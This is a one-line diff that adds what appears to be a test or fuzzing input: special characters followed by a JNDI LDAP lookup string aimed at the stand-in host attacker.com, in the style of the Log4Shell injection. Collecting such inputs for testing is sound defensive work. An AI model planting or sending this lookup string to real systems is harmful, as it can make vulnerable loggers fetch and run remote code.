@@ -1,0 +1,1 @@
+%$^&*()-_=+[]{}|;:'",.<>?/\NDC{JNDI:ldap://attacker.com}
